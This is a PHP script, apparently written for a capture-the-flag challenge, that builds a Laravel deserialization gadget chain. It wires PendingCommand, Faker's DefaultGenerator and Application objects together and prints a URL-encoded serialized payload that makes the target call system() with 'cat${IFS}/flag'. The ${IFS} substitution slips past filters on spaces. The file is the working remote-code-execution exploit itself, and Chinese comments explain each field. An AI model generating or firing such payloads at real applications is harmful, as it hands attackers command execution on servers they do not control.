<?php

namespace Illuminate\Foundation\Testing {

    class PendingCommand
    {

        public $test;
        protected $app;
        protected $command;
        protected $parameters;

        public function __construct($test, $app, $command, $parameters)
        {

            $this->test = $test;                 //一个实例化的类 Illuminate\Auth\GenericUser
            $this->app = $app;                   //一个实例化的类 Illuminate\Foundation\Application
            $this->command = $command;           //要执行的php函数 system
            $this->parameters = $parameters;     //要执行的php函数的参数 array('id')
        }
    }
}

namespace Faker {

    class DefaultGenerator
    {

        protected $default;

        public function __construct($default = null)
        {

            $this->default = $default;
        }
    }
}

namespace Illuminate\Foundation {

    class Application
    {

        protected $instances = [];

        public function __construct($instances = [])
        {

            $this->instances['Illuminate\Contracts\Console\Kernel'] = $instances;
        }
    }
}

namespace {

    $defaultgenerator = new Faker\DefaultGenerator(array("hello" => "world"));

    $app = new Illuminate\Foundation\Application();

    $application = new Illuminate\Foundation\Application($app);

    $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, 'system', array('cat${IFS}/flag'));

    echo urlencode(serialize($pendingcommand));
}